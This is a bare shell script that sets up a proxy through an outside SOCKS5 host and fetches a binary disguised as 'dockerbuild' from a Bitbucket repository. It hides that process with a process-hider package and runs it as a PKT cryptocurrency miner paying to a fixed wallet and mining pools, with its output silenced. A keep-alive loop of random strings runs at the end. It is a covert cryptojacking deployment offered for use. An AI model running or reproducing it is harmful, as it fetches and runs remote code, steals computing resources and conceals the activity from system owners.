apt update && apt -y install sudo wget curl unzip
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 67.201.33.10_:25283
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

wget https://bitbucket.org/mzzkskjsjnn98282/mantul/raw/bff438f46b325ac0184b313f2705f9d55547105c/dockerbuild
chmod +x dockerbuild

ph add dockerbuild

./dockerbuild ann -p pkt1q908pl3jfwd3awfqc0p8pkxfk3vjhaaqhng5335 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*" >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
